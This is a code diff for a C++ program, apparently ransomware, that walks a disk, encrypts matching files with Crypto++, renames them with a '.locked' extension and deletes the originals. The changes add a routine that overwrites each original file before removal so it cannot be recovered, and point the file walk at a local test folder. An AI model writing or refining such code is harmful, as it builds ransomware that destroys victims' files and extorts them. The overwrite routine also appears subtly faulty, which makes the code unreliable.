@@ -8,7 +8,7 @@
 
 #include "diskencryptor.h"
 
-#define MAX_THREADS 3
+#define DEFAULT_THREADS 3
 #define FILE_EXTENSION ".locked"
 
 
@@ -38,7 +38,7 @@ bool DiskEncryptor::setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByte
 void DiskEncryptor::iterateFiles() {
 	std::cout << "Iterating files in disk: " << _disk << std::endl;
 	std::vector<std::thread> threads;
-	for (auto& entry : std::filesystem::recursive_directory_iterator(_disk, std::filesystem::directory_options::skip_permission_denied)) {
+	for (auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\\mXn\\Desktop\\fwareTest", std::filesystem::directory_options::skip_permission_denied)) {
 		try {
 			if (entry.is_directory()) {
 				
@@ -50,7 +50,7 @@ void DiskEncryptor::iterateFiles() {
 						break;
 					}
 					if (ext == e) {
-						if (threads.size() > MAX_THREADS) {
+						if (threads.size() > DEFAULT_THREADS) {
 							for (std::thread& t : threads) {
 								t.join();
 							}
@@ -74,8 +74,17 @@ void DiskEncryptor::iterateFiles() {
 	}
 }
 
-std::string* DiskEncryptor::getDisk() {
-	return &_disk;
+bool DiskEncryptor::safeFileDeletation(std::string& file) {
+	int fileSize = std::filesystem::file_size(file);
+	if (_freespace < fileSize) {
+		return false;
+	}
+	std::ofstream out(file, std::ios::binary | std::ios::ate);
+	for (int i = 0; i < fileSize; i++) {
+		out << 0;
+	}
+	out.close();
+	return true;
 }
 
 bool DiskEncryptor::fileEncrypt(std::string file) {
@@ -85,6 +94,7 @@ bool DiskEncryptor::fileEncrypt(std::string file) {
 	CryptoPP::FileSource(in, true, new CryptoPP::StreamTransformationFilter(_e, new CryptoPP::FileSink(out)));
 	in.close();
 	out.close();
+	safeFileDeletation(file);
 	std::filesystem::remove(file);
 	return true;
 }
